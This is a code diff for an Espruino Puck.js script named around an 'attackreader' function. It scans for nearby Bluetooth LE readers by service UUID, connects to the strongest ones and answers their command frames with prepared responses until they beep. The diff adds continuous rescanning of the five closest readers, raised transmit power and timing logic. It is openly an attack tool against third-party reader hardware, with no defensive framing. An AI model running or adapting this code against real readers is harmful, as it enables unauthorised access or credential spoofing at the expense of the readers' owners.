@@ -10,8 +10,12 @@ var button = 0;
 var hids = [];
 var devs = [];
 var id;
+var vid;
 var starttime;
+var tscantime;
 var endtime;
+var e;
+var beeptime;
 
 E.enableWatchdog(120); // If scan or connect hangs, reboot Puck                                                        
 
@@ -21,9 +25,13 @@ function attackreader() {
     looptime.push(getTime());
     if (hids.length > 0) {
         console.log("Remaining devices: " + hids.length);
-        var dev = hids.shift();
+        var jdev = JSON.parse(JSON.stringify(hids.shift()));
+        var dev = jdev.id;
         console.log("Attacking Device: " + dev);
-        NRF.connect(dev).then(function(g) {
+        changeInterval(id, 20000);
+        if (button === 2) changeInterval(vid, 60000);
+        NRF.setTxPower(4);
+        NRF.connect(dev + " random").then(function(g) {
             gatt = g;
             digitalPulse(LED2, 1, [1000, 1000, 1000]);
             count = 0;
@@ -41,74 +49,120 @@ function attackreader() {
                     senthex += hex;
                 }
                 hexParts.join('');
-                //console.log("Received: " + senthex);
-                if (senthex === "c00a440aa000440011010") {
-                    characteristic.writeValue(wrong);
-                    //console.log("Sent Wrong Aid");
-                } else if (senthex === "c00a440aa00038202d0110") {
-                    characteristic.writeValue(wrong);
-                    //console.log("Sent Wrong Aid");
-                } else if (senthex.match("c00a440aa00038202f0110")) {
+                if (senthex === "c00a440aa00038202f0110") {
                     characteristic.writeValue(aid);
-                    //console.log("Sent Aid");
+                } else if (senthex.match("c00a440aa000")) {
+                    characteristic.writeValue(wrong);
                 } else if (senthex.match("c00da")) {
                     characteristic.writeValue(ack);
-                    //console.log("Sent Ack");
                 } else if (senthex === 'c00ca0000' && count == 0) {
                     count = (count + 1);
                     characteristic.writeValue(part1);
-                    //console.log("Sent Part1");
                     setTimeout(function() {
                         characteristic.writeValue(part2);
                     }, 250);
-                    //console.log("Sent Part2");
                 } else if (senthex.match("c00da73000")) {
                     characteristic.writeValue(ack);
-                    //console.log("Sent Ack");
                 } else if (count == 1 && senthex === 'c00ca0000') {
                     characteristic.writeValue(longbeep);
+                    console.log("Beep");
                     try {
                         gatt.disconnect();
-                    } catch (e) {}
+                    } catch (e) {
+                        console.log('Gatt Catch');
+                    }
                     try {
                         dev.disconnect();
-                    } catch (e) {}
-                    console.log("Beep");
-                    //rollleds(250);
+                    } catch (e) {
+                        console.log('Dev Catch');
+                    }
+                    beeptime = getTime();
                     looptime.push(getTime());
                     console.log("Looptime: " + (looptime.pop() - looptime.shift()).toFixed(2) + " secs");
+                    changeInterval(id, 4000);
+                    console.log(" ");
                 } else {
                     looptime.push(getTime());
                     digitalPulse(LED1, 1, 2500);
+                    clearInterval();
                     console.log("Failed with " + senthex);
                     console.log(looptime);
                     console.log("Looptime: " + (looptime.pop() - looptime.shift()).toFixed(2) + " secs");
+                    console.log(" ");
                 }
             });
             return characteristic.startNotifications();
-        }).catch(function() {
+        }).catch(function(e) {
             console.log("Catch function");
-            clearInterval(id);
             digitalPulse(LED1, 1, [500, 500, 500, 500, 500]);
             endtime = getTime();
             console.log("Total Time: " + (endtime - starttime).toFixed(2) + " secs");
             try {
                 gatt.disconnect();
-            } catch (e) {}
+            } catch (e) {
+                console.log('Notification Catch');
+            }
         });
     } else {
         console.log("Complete attack and clearing timer");
         clearInterval(id);
         rollleds(250);
         endtime = getTime();
-        console.log("Total Time: " + (endtime - starttime).toFixed(2) + " secs");
-        if (button === 1) {
-            console.log("Rescanning for readers");
-            doScan();
-        } else if (button === 2) {
+        var totaltime = (endtime - starttime).toFixed(2);
+        var rescantime = (endtime - beeptime).toFixed(2);
+        console.log("Total Time: " + totaltime + " secs");
+        console.log(" ");
+        if (button === 2) {
+            changeInterval(vid, ((30 - tscantime) - rescantime) * 1000);
+            console.log("Estimated interval for rescan: " + ((30 - tscantime) - rescantime) + " secs");
+        }
+        if (button === 3) {
             console.log("Stopping scan");
             clearInterval();
         }
+    }
+}
+
+function doScan() {
+    if (button === 2) changeInterval(vid, 60000);
+    var scantime = [];
+    scantime.push(getTime());
+    starttime = scantime[0];
+    if (button === 3) {
+        console.log("Stopping scan");
+        clearInterval();
+    } else {
+        var packets = 20;
+        digitalPulse(LED3, 1, [750, 750, 750]);
+        NRF.setScan(function(devs) {
+            packets--;
+            pjson = JSON.parse(JSON.stringify(devs));
+            var rid = ((pjson.id).split(" ")[0]);
+            if (hids.map(x => x.id).indexOf(rid) == -1) {
+                hids.push({
+                    id: rid,
+                    rssi: pjson.rssi
+                });
+            }
+            if ((packets <= 0) || (hids.length === 5)) {
+                NRF.setScan();
+                console.log("Number of readers: " + hids.length);
+                scantime.push(getTime());
+                tscantime = (scantime.pop() - scantime.shift()).toFixed(2);
+                if (hids.length != 0) {
+                    hids.sort((a, b) => parseFloat(b.rssi) - parseFloat(a.rssi));
+                    id = setInterval(attackreader, 500);
+                } else if (button === 1) {
+                    console.log("No readers detected");
+                    digitalPulse(LED1, 1, [500, 500, 500, 500, 500]);
+                    clearInterval();
+                }
+            }
+        }, {
+            filters: [{
+                services: ["00009800-0000-1000-8000-00177a000002"]
+            }]
+        });
     }
 }
 
@@ -118,43 +172,19 @@ function rollleds(ledtime) {
     digitalPulse(LED1, 1, (ledtime * 3));
 }
 
-function doScan() {
-    starttime = getTime();
-    digitalPulse(LED3, 1, [500, 500, 500]);
-    NRF.findDevices(function(devs) {
-        devs.sort((a, b) => parseFloat(b.rssi) - parseFloat(a.rssi));
-        hids = devs.map(x => x.id);
-        console.log("Number of readers: " + hids.length);
-        if (hids.length != 0) {
-            console.log("Kicked timer");
-            E.kickWatchdog();
-            attackreader();
-            id = setInterval(attackreader, 30000);
-        } else if (button === 0) {
-            console.log("No readers detected");
-            digitalPulse(LED1, 1, [500, 500, 500, 500, 500]);
-            clearInterval();
-        }
-    }, {
-        timeout: 2000,
-        filters: [{
-            services: ["00009800-0000-1000-8000-00177a000002"]
-        }]
-    });
-}
 setWatch(function(e) {
     var btntime = (e.time - e.lastTime);
-    if (btntime < 0.5) { // on short press loop through closest devices only once
+    if (btntime < 0.5) { // on short press loop through 5 of the closest devices only once
         console.log("One scan");
-        button = 0;
-        doScan();
-    } else if (btntime > 0.51 && btntime < 2.0) { //on medium press this will continually loop through the closest 5 readers
-        console.log("Continuious");
         button = 1;
         doScan();
+    } else if ((btntime > 0.5) && (btntime < 2.0)) { // on medium press use repeat on 5 of the closest scanned devices
+        console.log("Continuous scan");
+        button = 2;
+        vid = setInterval(doScan, 500);
     } else if (btntime > 2.01) { // on long press break out of cycle
         console.log("Trying to break loop scan");
-        button = 2;
+        button = 3;
         clearInterval();
     }
 }, BTN, {
